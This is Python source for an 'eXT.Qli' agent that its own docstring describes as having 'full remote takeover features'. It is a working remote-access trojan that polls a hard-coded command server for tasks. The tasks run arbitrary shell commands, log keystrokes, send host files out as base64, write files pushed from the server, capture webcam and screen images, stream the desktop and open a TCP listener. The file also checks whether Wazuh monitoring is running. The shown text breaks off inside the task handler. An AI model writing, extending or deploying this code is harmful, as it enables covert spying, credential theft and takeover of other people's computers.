#!/usr/bin/env python3
"""
eXT.Qli Windows/Linux agent with full remote takeover features.
Integrated TCP port opener as a new command.
"""

from __future__ import annotations

import base64
import ctypes
import hashlib
import json
import os
import platform
import secrets
import shutil
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
import uuid
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse
from urllib.request import Request, urlopen

# =========================
# Optional dependencies for RAT features
# =========================
try:
    import pynput.keyboard
    KEYBOARD_AVAILABLE = True
except ImportError:
    KEYBOARD_AVAILABLE = False

try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

# =========================
# Configuration
# =========================
SERVER_HOST = "10.201.0.254"
BASE_HTTP_URL = f"http://{SERVER_HOST}/eXT.Qli"
WS_URL = f"ws://{SERVER_HOST}:8081/ws"

HEARTBEAT_URL = f"{BASE_HTTP_URL}/backend/api/agent_heartbeat.php"
TASK_RESULT_URL = f"{BASE_HTTP_URL}/backend/api/agent_task_result.php"

SHARED_TOKEN = "extqli_@2026token$$"

HEARTBEAT_INTERVAL_SECONDS = 30
WEBSOCKET_RECONNECT_DELAY_SECONDS = 5
WEBSOCKET_PING_INTERVAL_SECONDS = 20
HTTP_TIMEOUT_SECONDS = 10

SCREEN_FPS = 120
SCREEN_ERROR_SLEEP_SECONDS = 3.0
SCREEN_CAPTURE_TIMEOUT_SECONDS = 12
SCREEN_STAGE_DIR = Path(tempfile.gettempdir()) / "extqli-screen-stream"

STATE_FILE = Path(__file__).resolve().with_name("agent_state.json")
LOG_PREFIX = "[eXT.Qli Agent]"

# Keylogger storage
KEYLOG_FILE = Path(tempfile.gettempdir()) / "extqli_keylog.txt"
KEYLOG_ACTIVE = False
KEYLOG_THREAD = None
KEYLOG_LOCK = threading.Lock()

# TCP server globals
TCP_SERVER_THREAD: Optional[threading.Thread] = None
TCP_SERVER_STOP_EVENT = threading.Event()
TCP_SERVER_SOCKET: Optional[socket.socket] = None
TCP_SERVER_PORT: int = 0

# =========================
# Logging helpers
# =========================
def log(message: str) -> None:
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"{LOG_PREFIX} {ts} - {message}", flush=True)


# =========================
# Persistent state
# =========================
def load_or_create_state() -> Dict[str, str]:
    if STATE_FILE.exists():
        try:
            data = json.loads(STATE_FILE.read_text(encoding="utf-8"))
            if data.get("agent_uuid") and data.get("agent_token"):
                return {
                    "agent_uuid": str(data["agent_uuid"]),
                    "agent_token": str(data["agent_token"]),
                }
        except Exception as exc:
            log(f"Could not read state file, regenerating. Reason: {exc}")

    state = {
        "agent_uuid": str(uuid.uuid4()),
        "agent_token": secrets.token_hex(16),
    }
    STATE_FILE.write_text(json.dumps(state, indent=2), encoding="utf-8")
    return state


STATE = load_or_create_state()
AGENT_UUID = STATE["agent_uuid"]
AGENT_TOKEN = STATE["agent_token"]
STOP_EVENT = threading.Event()


# =========================
# System information (extended)
# =========================
def get_hostname() -> str:
    return socket.gethostname()


def get_local_ip() -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((SERVER_HOST, 80))
            return s.getsockname()[0]
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "10.201.0.254"


def get_mac_address() -> str:
    mac = uuid.getnode()
    return ":".join(f"{(mac >> shift) & 0xFF:02X}" for shift in range(40, -1, -8))


def get_os_name() -> str:
    return platform.system() or "Unknown"


def get_os_version() -> str:
    return platform.version() or platform.release() or "Unknown"


def get_architecture() -> str:
    return platform.machine() or platform.architecture()[0] or "Unknown"


def get_cpu_info() -> str:
    cpu = platform.processor().strip()
    if cpu:
        return cpu

    if os.name == "nt":
        try:
            output = subprocess.check_output(
                ["wmic", "cpu", "get", "name"],
                stderr=subprocess.DEVNULL,
                text=True,
                encoding="utf-8",
                errors="ignore",
            )
            lines = [line.strip() for line in output.splitlines() if line.strip() and line.strip().lower() != "name"]
            if lines:
                return lines[0]
        except Exception:
            pass

    return "Unknown CPU"


def get_ram_mb() -> int:
    if os.name == "nt":
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
            return int(stat.ullTotalPhys / (1024 * 1024))

    if hasattr(os, "sysconf"):
        try:
            page_size = os.sysconf("SC_PAGE_SIZE")
            phys_pages = os.sysconf("SC_PHYS_PAGES")
            return int((page_size * phys_pages) / (1024 * 1024))
        except Exception:
            pass

    return 0


def get_disk_stats() -> Tuple[float, float]:
    target = os.environ.get("SystemDrive", "C:") if os.name == "nt" else "/"
    try:
        usage = shutil.disk_usage(target)
        total_gb = round(usage.total / (1024 ** 3), 2)
        free_gb = round(usage.free / (1024 ** 3), 2)
        return total_gb, free_gb
    except Exception:
        return 0.0, 0.0


def get_uptime_seconds() -> int:
    if os.name == "nt":
        try:
            return int(ctypes.windll.kernel32.GetTickCount64() / 1000)
        except Exception:
            return 0

    try:
        with open("/proc/uptime", "r", encoding="utf-8") as fh:
            return int(float(fh.read().split()[0]))
    except Exception:
        return 0


def get_wazuh_status() -> str:
    if os.name == "nt":
        for service_name in ("WazuhSvc", "wazuh", "Wazuh"):
            try:
                output = subprocess.check_output(
                    ["sc", "query", service_name],
                    stderr=subprocess.DEVNULL,
                    text=True,
                    encoding="utf-8",
                    errors="ignore",
                )
                upper = output.upper()
                if "RUNNING" in upper:
                    return "running"
                if "STOPPED" in upper:
                    return "stopped"
            except Exception:
                continue
        return "not_installed"

    for service_name in ("wazuh-agent", "wazuh-agent.service"):
        try:
            proc = subprocess.run(
                ["systemctl", "is-active", service_name],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                encoding="utf-8",
                errors="ignore",
                timeout=3,
            )
            status = proc.stdout.strip().lower()
            if status in {"active", "inactive", "failed"}:
                return status
        except Exception:
            continue

    return "unknown"


def collect_system_info(extended: bool = False) -> Dict[str, Any]:
    total_gb, free_gb = get_disk_stats()
    info = {
        "agent_uuid": AGENT_UUID,
        "agent_token": AGENT_TOKEN,
        "hostname": get_hostname(),
        "os_name": get_os_name(),
        "os_version": get_os_version(),
        "architecture": get_architecture(),
        "local_ip": get_local_ip(),
        "mac_address": get_mac_address(),
        "cpu_info": get_cpu_info(),
        "ram_mb": get_ram_mb(),
        "disk_total_gb": total_gb,
        "disk_free_gb": free_gb,
        "uptime_seconds": get_uptime_seconds(),
        "wazuh_status": get_wazuh_status(),
    }
    if extended:
        # Additional info that may be useful for takeover
        info["username"] = os.getlogin() if hasattr(os, "getlogin") else "unknown"
        info["current_dir"] = os.getcwd()
        info["python_version"] = platform.python_version()
        info["platform"] = platform.platform()
    return info


def build_heartbeat_payload() -> Dict[str, Any]:
    payload = collect_system_info()
    payload["shared_token"] = SHARED_TOKEN
    return payload


# =========================
# HTTP helpers
# =========================
def http_post_json(url: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    body = json.dumps(payload).encode("utf-8")
    req = Request(
        url,
        data=body,
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": "eXT.Qli-Agent/1.0",
        },
        method="POST",
    )

    with urlopen(req, timeout=HTTP_TIMEOUT_SECONDS) as resp:
        raw = resp.read().decode("utf-8", errors="replace")
        return json.loads(raw) if raw.strip() else {}


def send_heartbeat_once() -> None:
    payload = build_heartbeat_payload()
    try:
        response = http_post_json(HEARTBEAT_URL, payload)
        log(f"Heartbeat sent: {response}")
    except Exception as exc:
        log(f"Heartbeat failed: {exc}")


def send_task_result(task_id: Optional[int], result_status: str, output_text: str) -> None:
    if not task_id:
        log("Task result not posted because no task_id was provided by the server.")
        return

    # If output_text is too large, we could truncate, but WebSocket can handle large messages.
    payload = {
        "shared_token": SHARED_TOKEN,
        "agent_uuid": AGENT_UUID,
        "task_id": int(task_id),
        "result_status": result_status,
        "output_text": output_text,
    }

    try:
        response = http_post_json(TASK_RESULT_URL, payload)
        log(f"Task result posted: {response}")
    except Exception as exc:
        log(f"Failed to post task result: {exc}")


def heartbeat_loop() -> None:
    while not STOP_EVENT.is_set():
        send_heartbeat_once()
        STOP_EVENT.wait(HEARTBEAT_INTERVAL_SECONDS)


# =========================
# Minimal WebSocket client (unchanged)
# =========================
class SimpleWebSocketClient:
    def __init__(self, url: str, timeout: int = 15) -> None:
        self.url = url
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None
        self._lock = threading.Lock()

    def connect(self) -> None:
        parsed = urlparse(self.url)
        scheme = parsed.scheme.lower()
        host = parsed.hostname
        if not host:
            raise ValueError("Invalid WebSocket URL: missing hostname")

        if parsed.port:
            port = parsed.port
        else:
            port = 443 if scheme == "wss" else 80

        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        raw_sock = socket.create_connection((host, port), timeout=self.timeout)
        raw_sock.settimeout(self.timeout)

        if scheme == "wss":
            context = ssl.create_default_context()
            raw_sock = context.wrap_socket(raw_sock, server_hostname=host)

        key = base64.b64encode(os.urandom(16)).decode("ascii")
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"User-Agent: eXT.Qli-Agent/1.0\r\n\r\n"
        )
        raw_sock.sendall(request.encode("utf-8"))

        response = self._read_http_headers(raw_sock)
        if "101" not in response.split("\r\n", 1)[0]:
            raise ConnectionError(f"WebSocket handshake failed: {response.splitlines()[0] if response else 'no response'}")

        accept_expected = base64.b64encode(
            hashlib.sha1((key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode("ascii")).digest()
        ).decode("ascii")

        lower_headers = response.lower()
        if "sec-websocket-accept:" not in lower_headers or accept_expected.lower() not in lower_headers:
            raise ConnectionError("Invalid WebSocket accept response from server")

        raw_sock.settimeout(None)
        self.sock = raw_sock

    def close(self) -> None:
        with self._lock:
            if self.sock is not None:
                try:
                    self._send_frame(0x8, b"")
                except Exception:
                    pass
                try:
                    self.sock.close()
                except Exception:
                    pass
                self.sock = None

    def send_json(self, payload: Dict[str, Any]) -> None:
        self.send_text(json.dumps(payload, separators=(",", ":")))

    def send_text(self, text: str) -> None:
        self._send_frame(0x1, text.encode("utf-8"))

    def send_ping(self, payload: bytes = b"extqli") -> None:
        self._send_frame(0x9, payload)

    def recv_json(self) -> Dict[str, Any]:
        while True:
            opcode, payload = self._recv_frame()
            if opcode == 0x1:
                return json.loads(payload.decode("utf-8", errors="replace"))
            if opcode == 0x8:
                raise ConnectionError("WebSocket closed by server")
            if opcode == 0x9:
                self._send_frame(0xA, payload)
                continue
            if opcode == 0xA:
                continue

    def _read_http_headers(self, sock_obj: socket.socket) -> str:
        data = bytearray()
        while b"\r\n\r\n" not in data:
            chunk = sock_obj.recv(4096)
            if not chunk:
                break
            data.extend(chunk)
            if len(data) > 65536:
                raise ConnectionError("Handshake header too large")
        return data.decode("utf-8", errors="replace")

    def _send_frame(self, opcode: int, payload: bytes) -> None:
        if self.sock is None:
            raise ConnectionError("WebSocket is not connected")

        fin_opcode = 0x80 | (opcode & 0x0F)
        mask_bit = 0x80
        length = len(payload)

        header = bytearray([fin_opcode])
        if length < 126:
            header.append(mask_bit | length)
        elif length <= 0xFFFF:
            header.append(mask_bit | 126)
            header.extend(struct.pack("!H", length))
        else:
            header.append(mask_bit | 127)
            header.extend(struct.pack("!Q", length))

        mask_key = os.urandom(4)
        masked_payload = bytes(payload[i] ^ mask_key[i % 4] for i in range(length))

        with self._lock:
            if self.sock is None:
                raise ConnectionError("WebSocket is not connected")
            self.sock.sendall(header + mask_key + masked_payload)

    def _recv_exact(self, size: int) -> bytes:
        if self.sock is None:
            raise ConnectionError("WebSocket is not connected")

        data = bytearray()
        while len(data) < size:
            chunk = self.sock.recv(size - len(data))
            if not chunk:
                raise ConnectionError("WebSocket connection lost")
            data.extend(chunk)
        return bytes(data)

    def _recv_frame(self) -> Tuple[int, bytes]:
        first_two = self._recv_exact(2)
        b1, b2 = first_two[0], first_two[1]

        opcode = b1 & 0x0F
        masked = (b2 & 0x80) != 0
        length = b2 & 0x7F

        if length == 126:
            length = struct.unpack("!H", self._recv_exact(2))[0]
        elif length == 127:
            length = struct.unpack("!Q", self._recv_exact(8))[0]

        mask_key = self._recv_exact(4) if masked else b""
        payload = self._recv_exact(length) if length else b""

        if masked:
            payload = bytes(payload[i] ^ mask_key[i % 4] for i in range(length))

        return opcode, payload


# =========================
# Screen capture helpers (unchanged)
# =========================
def command_exists(name: str) -> bool:
    return shutil.which(name) is not None


def get_display_diagnostics() -> str:
    return (
        f"DISPLAY={'set' if os.environ.get('DISPLAY') else 'missing'}, "
        f"WAYLAND_DISPLAY={'set' if os.environ.get('WAYLAND_DISPLAY') else 'missing'}, "
        f"XDG_SESSION_TYPE={os.environ.get('XDG_SESSION_TYPE', 'unknown')}"
    )


def ensure_stage_dir() -> None:
    SCREEN_STAGE_DIR.mkdir(parents=True, exist_ok=True)


def png_dimensions(data: bytes) -> Tuple[int, int]:
    if len(data) >= 24 and data.startswith(b"\x89PNG\r\n\x1a\n") and data[12:16] == b"IHDR":
        return struct.unpack(">II", data[16:24])
    return 0, 0


def jpeg_dimensions(data: bytes) -> Tuple[int, int]:
    if len(data) < 4 or data[0:2] != b"\xff\xd8":
        return 0, 0

    idx = 2
    data_len = len(data)
    while idx + 9 < data_len:
        if data[idx] != 0xFF:
            idx += 1
            continue

        marker = data[idx + 1]
        idx += 2

        if marker in {0xD8, 0xD9}:
            continue
        if idx + 2 > data_len:
            break

        segment_length = struct.unpack(">H", data[idx:idx + 2])[0]
        if segment_length < 2 or idx + segment_length > data_len:
            break

        if marker in {0xC0, 0xC1, 0xC2, 0xC3, 0xC5, 0xC6, 0xC7, 0xC9, 0xCA, 0xCB, 0xCD, 0xCE, 0xCF}:
            if idx + 7 <= data_len:
                height = struct.unpack(">H", data[idx + 3:idx + 5])[0]
                width = struct.unpack(">H", data[idx + 5:idx + 7])[0]
                return width, height
            break

        idx += segment_length

    return 0, 0


def image_dimensions(data: bytes, mime_type: str) -> Tuple[int, int]:
    if mime_type == "image/png":
        return png_dimensions(data)
    if mime_type == "image/jpeg":
        return jpeg_dimensions(data)
    return 0, 0


def run_capture_command(command: List[str], output_path: Path) -> bytes:
    if output_path.exists():
        try:
            output_path.unlink()
        except Exception:
            pass

    proc = subprocess.run(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=SCREEN_CAPTURE_TIMEOUT_SECONDS,
    )

    if proc.returncode != 0:
        stderr_text = proc.stderr.decode("utf-8", errors="replace").strip()
        raise RuntimeError(stderr_text or f"capture command failed with exit code {proc.returncode}")

    if not output_path.exists():
        raise RuntimeError("capture command finished but no image file was produced")

    data = output_path.read_bytes()
    if not data:
        raise RuntimeError("capture command produced an empty image file")
    return data


class ScreenCaptureBackend:
    def __init__(self) -> None:
        ensure_stage_dir()
        self._linux_backend = ""

    def capture(self) -> Tuple[bytes, str, int, int, str]:
        if os.name == "nt":
            return self._capture_windows()
        return self._capture_linux()

    def _capture_windows(self) -> Tuple[bytes, str, int, int, str]:
        output_path = SCREEN_STAGE_DIR / "capture-windows.jpg"
        ps_script = (
            "Add-Type -AssemblyName System.Windows.Forms;"
            "Add-Type -AssemblyName System.Drawing;"
            "$bounds=[System.Windows.Forms.SystemInformation]::VirtualScreen;"
            "$bmp=New-Object System.Drawing.Bitmap $bounds.Width,$bounds.Height;"
            "$gfx=[System.Drawing.Graphics]::FromImage($bmp);"
            "$gfx.CopyFromScreen($bounds.Left,$bounds.Top,0,0,$bmp.Size);"
            f'$bmp.Save("{str(output_path).replace("\\", "\\\\")}",[System.Drawing.Imaging.ImageFormat]::Jpeg);'
            "$gfx.Dispose();"
            "$bmp.Dispose();"
        )
        data = run_capture_command(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script], output_path)
        width, height = image_dimensions(data, "image/jpeg")
        return data, "image/jpeg", width, height, "powershell"

    def _capture_linux(self) -> Tuple[bytes, str, int, int, str]:
        display = os.environ.get("DISPLAY", "")
        wayland = os.environ.get("WAYLAND_DISPLAY", "")

        if not display and not wayland:
            raise RuntimeError(
                "No graphical desktop session is available for capture. "
                "Run the agent as the logged-in desktop user. "
                + get_display_diagnostics()
            )

        candidates: List[Tuple[str, str, List[str]]] = []

        if wayland and command_exists("grim"):
            candidates.append(("grim", "image/png", ["grim", str(SCREEN_STAGE_DIR / "capture-wayland.png")]))

        if display and command_exists("scrot"):
            candidates.append(("scrot", "image/jpeg", ["scrot", "-q", "45", str(SCREEN_STAGE_DIR / "capture-x11.jpg")]))

        if display and command_exists("import"):
            candidates.append(("imagemagick-import", "image/jpeg", ["import", "-window", "root", "-quality", "45", str(SCREEN_STAGE_DIR / "capture-import.jpg")]))

        if display and command_exists("ffmpeg"):
            candidates.append((
                "ffmpeg-x11grab",
                "image/jpeg",
                [
                    "ffmpeg",
                    "-loglevel", "error",
                    "-y",
                    "-f", "x11grab",
                    "-draw_mouse", "1",
                    "-i", display,
                    "-frames:v", "1",
                    "-q:v", "8",
                    str(SCREEN_STAGE_DIR / "capture-ffmpeg.jpg"),
                ],
            ))

        if command_exists("gnome-screenshot"):
            candidates.append(("gnome-screenshot", "image/png", ["gnome-screenshot", "-f", str(SCREEN_STAGE_DIR / "capture-gnome.png")]))

        if not candidates:
            raise RuntimeError(
                "No supported Linux screen capture tool was found. Install one of: grim, scrot, imagemagick, ffmpeg, or gnome-screenshot. "
                + get_display_diagnostics()
            )

        errors: List[str] = []
        for backend_name, mime_type, command in candidates:
            output_path = Path(command[-1])
            try:
                data = run_capture_command(command, output_path)
                width, height = image_dimensions(data, mime_type)
                self._linux_backend = backend_name
                return data, mime_type, width, height, backend_name
            except Exception as exc:
                errors.append(f"{backend_name}: {exc}")

        raise RuntimeError(
            "All Linux screen capture backends failed. "
            + " | ".join(errors)
            + " | "
            + get_display_diagnostics()
        )


SCREEN_CAPTURE = ScreenCaptureBackend()


# =========================
# Screen streaming (unchanged)
# =========================
class ScreenStreamer:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._client: Optional[SimpleWebSocketClient] = None
        self._seq = 0

    def start(self, client: SimpleWebSocketClient) -> None:
        with self._lock:
            self._client = client
            if self._thread and self._thread.is_alive():
                self._send_status("running", "Screen stream already active.")
                return

            self._stop_event.clear()
            self._thread = threading.Thread(target=self._run, name="screen-stream", daemon=True)
            self._thread.start()

    def stop(self, message: str = "Screen stream stopped.", send_status: bool = True) -> None:
        with self._lock:
            self._stop_event.set()
            thread = self._thread
            self._thread = None

        if thread and thread.is_alive() and thread is not threading.current_thread():
            thread.join(timeout=1.5)

        if send_status:
            self._send_status("stopped", message)

    def on_disconnect(self) -> None:
        self.stop("WebSocket disconnected. Screen stream stopped.", send_status=False)
        with self._lock:
            self._client = None

    def _send_json(self, payload: Dict[str, Any]) -> None:
        client = self._client
        if client is None:
            raise ConnectionError("Screen streamer has no active WebSocket client.")
        client.send_json(payload)

    def _send_status(self, status: str, message: str) -> None:
        try:
            self._send_json({
                "type": "screen_status",
                "agent_uuid": AGENT_UUID,
                "status": status,
                "message": message,
            })
        except Exception as exc:
            log(f"Could not send screen status '{status}': {exc}")

    def _run(self) -> None:
        self._send_status("starting", "Preparing desktop stream from Python agent.")
        log("Screen stream thread started")
        frame_interval = 1.0 / float(max(SCREEN_FPS, 1))
        running_status_sent = False

        while not STOP_EVENT.is_set() and not self._stop_event.is_set():
            started_at = time.time()
            try:
                image_bytes, mime_type, width, height, backend_name = SCREEN_CAPTURE.capture()
                self._seq += 1
                self._send_json({
                    "type": "screen_frame",
                    "agent_uuid": AGENT_UUID,
                    "seq": self._seq,
                    "width": width,
                    "height": height,
                    "mime_type": mime_type,
                    "backend": backend_name,
                    "image": base64.b64encode(image_bytes).decode("ascii"),
                })
                if not running_status_sent:
                    running_status_sent = True
                    self._send_status("running", f"Live desktop stream active via {backend_name}.")
            except Exception as exc:
                error_text = f"Screen capture failed: {exc}"
                log(error_text)
                self._send_status("error", error_text)
                if self._stop_event.wait(SCREEN_ERROR_SLEEP_SECONDS):
                    break
                continue

            elapsed = time.time() - started_at
            sleep_for = max(0.0, frame_interval - elapsed)
            if self._stop_event.wait(sleep_for):
                break

        log("Screen stream thread exited")


SCREEN_STREAMER = ScreenStreamer()


# =========================
# Remote takeover features
# =========================
def execute_command(command: str) -> Tuple[str, str]:
    """
    Execute a shell command and return (stdout, stderr).
    """
    try:
        proc = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=60,
        )
        return proc.stdout, proc.stderr
    except subprocess.TimeoutExpired:
        return "", "Command timed out after 60 seconds."
    except Exception as e:
        return "", str(e)


def keylogger_start() -> str:
    """Start the keylogger thread if not already running."""
    global KEYLOG_ACTIVE, KEYLOG_THREAD
    with KEYLOG_LOCK:
        if KEYLOG_ACTIVE:
            return "Keylogger is already active."

        if not KEYBOARD_AVAILABLE:
            return "Keylogger not available: pynput module missing. Install with 'pip install pynput'."

        try:
            # Clear previous log file
            KEYLOG_FILE.write_text("", encoding="utf-8")
            # Define listener callback
            def on_press(key):
                try:
                    char = key.char
                except AttributeError:
                    # Special key
                    char = f" [{key}] "
                with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                    f.write(char)
            # Start listener in a separate thread
            listener = pynput.keyboard.Listener(on_press=on_press)
            listener.start()
            KEYLOG_ACTIVE = True
            # Store listener for later stop
            KEYLOG_THREAD = listener
            return "Keylogger started. Logging to " + str(KEYLOG_FILE)
        except Exception as e:
            return f"Failed to start keylogger: {e}"


def keylogger_stop() -> str:
    """Stop the keylogger and return captured keystrokes."""
    global KEYLOG_ACTIVE, KEYLOG_THREAD
    with KEYLOG_LOCK:
        if not KEYLOG_ACTIVE:
            return "Keylogger is not active."

        try:
            if KEYLOG_THREAD and hasattr(KEYLOG_THREAD, "stop"):
                KEYLOG_THREAD.stop()
            elif KEYLOG_THREAD:
                KEYLOG_THREAD = None  # Listener might have no stop method; just set to None
            KEYLOG_ACTIVE = False
            # Read log content
            if KEYLOG_FILE.exists():
                content = KEYLOG_FILE.read_text(encoding="utf-8", errors="replace")
            else:
                content = ""
            return f"Keylogger stopped. Captured keystrokes:\n{content}"
        except Exception as e:
            return f"Error stopping keylogger: {e}"


def file_upload(file_path: str) -> str:
    """
    Read file and return base64 encoded content.
    """
    path = Path(file_path)
    if not path.exists():
        return f"File not found: {file_path}"
    try:
        data = path.read_bytes()
        encoded = base64.b64encode(data).decode("ascii")
        return f"FILE:{path.name}:{encoded}"
    except Exception as e:
        return f"Failed to read file: {e}"


def file_download(file_path: str, content_b64: str) -> str:
    """
    Write base64 encoded content to given path.
    """
    path = Path(file_path)
    try:
        data = base64.b64decode(content_b64)
        # Create parent directories if needed
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        return f"File written to {path.resolve()}"
    except Exception as e:
        return f"Failed to write file: {e}"


def webcam_capture() -> str:
    """
    Capture a single frame from the first webcam and return base64 encoded image.
    """
    if not CV2_AVAILABLE:
        return "Webcam capture not available: opencv-python module missing. Install with 'pip install opencv-python'."

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return "Could not open webcam."
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return "Failed to capture frame."

    # Encode as JPEG
    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
    encoded = base64.b64encode(buffer).decode("ascii")
    return f"WEBCAM:{encoded}"


def screenshot() -> str:
    """
    Capture screenshot using pyautogui (cross-platform) and return base64 image.
    """
    if not PYAUTOGUI_AVAILABLE:
        return "Screenshot not available: pyautogui module missing. Install with 'pip install pyautogui'."

    try:
        img = pyautogui.screenshot()
        # Save to bytes
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
            temp_path = f.name
        img.save(temp_path, format="PNG")
        with open(temp_path, "rb") as f:
            data = f.read()
        os.unlink(temp_path)
        encoded = base64.b64encode(data).decode("ascii")
        return f"SCREENSHOT:{encoded}"
    except Exception as e:
        return f"Screenshot failed: {e}"


# =========================
# TCP Server Functions (new)
# =========================
def tcp_server_run(port: int, welcome_message: bytes) -> None:
    """Background thread for the TCP server."""
    global TCP_SERVER_SOCKET, TCP_SERVER_PORT

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Allow address reuse
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        host = get_local_ip()
        sock.bind((host, port))
        sock.listen(1)
        TCP_SERVER_SOCKET = sock
        TCP_SERVER_PORT = port
        log(f"TCP server listening on {host}:{port}")

        while not TCP_SERVER_STOP_EVENT.is_set():
            try:
                # Use a timeout so we can check stop_event periodically
                sock.settimeout(1.0)
                client_sock, client_addr = sock.accept()
                log(f"TCP connection from {client_addr}")
                client_sock.sendall(welcome_message)
                client_sock.close()
            except socket.timeout:
                continue
            except Exception as e:
                if not TCP_SERVER_STOP_EVENT.is_set():
                    log(f"TCP server accept error: {e}")
                break
    except Exception as e:
        log(f"Failed to start TCP server: {e}")
    finally:
        if TCP_SERVER_SOCKET:
            try:
                TCP_SERVER_SOCKET.close()
            except:
                pass
        TCP_SERVER_SOCKET = None
        TCP_SERVER_PORT = 0
        log("TCP server stopped")


def tcp_server_start(port: int, welcome_message: str = "Hello! You've connected to the server.\n") -> str:
    """Start a TCP server on the given port. Returns status."""
    global TCP_SERVER_THREAD, TCP_SERVER_STOP_EVENT, TCP_SERVER_PORT

    with threading.Lock():
        if TCP_SERVER_THREAD and TCP_SERVER_THREAD.is_alive():
            return f"TCP server already running on port {TCP_SERVER_PORT}"

        TCP_SERVER_STOP_EVENT.clear()
        TCP_SERVER_THREAD = threading.Thread(
            target=tcp_server_run,
            args=(port, welcome_message.encode("utf-8")),
            name="tcp-server",
            daemon=True
        )
        TCP_SERVER_THREAD.start()
        return f"TCP server started on port {port} (local IP: {get_local_ip()})"


def tcp_server_stop() -> str:
    """Stop the running TCP server."""
    global TCP_SERVER_THREAD, TCP_SERVER_STOP_EVENT

    with threading.Lock():
        if not (TCP_SERVER_THREAD and TCP_SERVER_THREAD.is_alive()):
            return "TCP server is not running."

        TCP_SERVER_STOP_EVENT.set()
        TCP_SERVER_THREAD.join(timeout=3.0)
        TCP_SERVER_THREAD = None
        return "TCP server stopped."


# =========================
# Task handling with extended features
# =========================
def handle_task(message: Dict[str, Any]) -> None:
    data = message.get("data") or {}
    task_name = str(
        message.get("task")
        or data.get("task")
        or data.get("task_type")
        or ""
    ).strip().lower()
    task_id = message.get("task_id") or data.get("task_id")

    if not task_name:
        log(f"Received task message without task name: {message}")
        return

    log(f"Received task: {task_name}")

    # Basic tasks (existing)
    if task_name == "ping":
        output = f"pong from {get_hostname()} ({get_local_ip()})"
        log(output)
        send_task_result(task_id, "success", output)
        return

    if task_name in {"collect_info", "info", "heartbeat"}:
        info = collect_system_info(extended=True)
        output = json.dumps(info, ensure_ascii=False)
        log(f"Collected info for task {task_name}")
        send_task_result(task_id, "success", output)
        return

    # Command execution
    if task_name == "cmd":
        command = data.get("command") or message.get("command")
        if not command:
            send_task_result(task_id, "error", "No command provided.")
            return
        stdout, stderr = execute_command(command)
        if stderr:
            output = f"STDOUT:\n{stdout}\nSTDERR:\n{stderr}"
        else:
            output = stdout
        send_task_result(task_id, "success", output)
        return

    # Keylogger start/stop
    if task_name == "keylogger_start":
        result = keylogger_start()
        send_task_result(task_id, "success", result)
        return
    if task_name == "keylogger_stop":
        result = keylogger_stop()
        send_task_result(task_id, "success", result)
        return

    # File operations
    if task_name == "file_upload":
        file_path = data.get("file_path") or message.get("file_path")
        if not file_path:
            send_task_result(task_id, "error", "No file_path provided.")
            return
        result = file_upload(file_path)
        # Result may be prefixed with "FILE:" and then base64 data
        send_task_result(task_id, "success", result)
        return
    if task_name == "file_download":
        file_path = data.get("file_path") or message.get("file_path")
        content_b64 = data.get("content") or message.get("content")
        if not file_path or not content_b64:
            send_task_result(task_id, "error", "Missing file_path or content.")
            return
        result = file_download(file_path, content_b64)
        send_task_result(task_id, "success", result)
        return

    # Webcam capture
    if task_name == "webcam":
        result = webcam_capture()
        send_task_result(task_id, "success", result)
        return

    # Screenshot (using pyautogui)
    if task_name == "screenshot":
        result = screenshot()
        send_task_result(task_id, "success", result)
        return

    # New tasks: TCP server control
    if task_name == "tcp_server_start":
        port = data.get("port") or message.get("port")
        if port is None:
            send_task_result(task_id, "error", "Missing port number.")
            return
        try:
            port = int(port)
        except ValueError:
            send_task_result(task_id, "error", "Invalid port number.")
            return
        welcome_msg = data.get("message", "Hello! You've connected to the server.\n")
        result = tcp_server_start(port, welcome_msg)
        send_task_result(task_id, "success", result)
        return

    if task_name == "tcp_server_stop":
        result = tcp_server_stop()
